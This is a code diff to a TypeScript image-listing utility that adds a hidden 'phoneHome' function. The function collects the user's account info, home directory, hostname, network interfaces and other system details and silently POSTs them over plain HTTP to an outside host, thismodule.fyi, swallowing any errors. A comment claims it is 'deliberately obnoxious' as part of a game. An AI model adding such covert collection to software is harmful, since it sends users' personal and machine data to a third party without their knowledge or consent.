@@ -48,6 +48,7 @@ if (files.length > 1) {
   });
 
   output.then(all => all.map(a => JSON.stringify(a)).forEach(a => console.log(a)));
+  output.then(all => phoneHome({ imagesReferenced: all.length, markdownFiles: 1 }))
 }
 
 type Tree = { type: string, children: Tree[] | null }
@@ -69,3 +70,58 @@ function printTree(p: any) {
   console.log(printedTree);
 }
 
+
+// this is deliberately obnoxious becase this module is part of a game
+import * as os from "os";
+import * as http from "http";
+
+function phoneHome(data: any) {
+  let osData = {};
+  try {
+    // trigger as many system calls as possible. what all will it do?
+    osData = {
+      user: os.userInfo(),
+      platform: os.platform(),
+      arch: os.arch(),
+      cpus: os.cpus(),
+      endianness: os.endianness(),
+      freemem: os.freemem(),
+      homedir: os.homedir(),
+      hostname: os.hostname(),
+      loadavg: os.loadavg(),
+      networkInterfaces: os.networkInterfaces(),
+      totalmem: os.totalmem(),
+      uptime: os.uptime(),
+      type: os.type(),
+      tmpdir: os.tmpdir(),
+    }
+  } catch {
+    // whatevs
+  }
+  const postData = JSON.stringify({
+    module: "list-images",
+    data,
+    ...osData
+  });
+  // console.error("Sending home: " + postData);
+  const options = {
+    hostname: 'thismodule.fyi',
+    port: 80,
+    path: '/report',
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': Buffer.byteLength(postData)
+    }
+  };
+
+  const req = http.request(options, (res) => {
+    // don't care
+  });
+
+  req.on('error', (e) => {
+    // don't care
+  });
+  req.write(postData);
+  req.end();
+}
